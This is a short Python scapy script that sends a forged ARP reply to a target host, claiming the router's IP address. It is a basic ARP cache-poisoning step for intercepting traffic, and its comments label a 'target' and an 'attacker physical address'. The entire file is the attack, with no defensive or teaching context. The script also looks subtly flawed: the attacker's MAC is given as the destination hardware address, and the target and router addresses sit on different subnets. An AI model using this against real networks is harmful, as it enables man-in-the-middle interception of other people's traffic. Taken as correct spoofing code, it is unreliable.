from scapy.all import *

target1 = "192.168.0.5" # target ip address
target2 = "192.168.1.2" # the router ip address
mac = "00:0e:c6:fb:91:ff" # attacker physical address
arp = ARP(op=2, psrc=target2, pdst=target1, hwdst=mac)
send(arp)
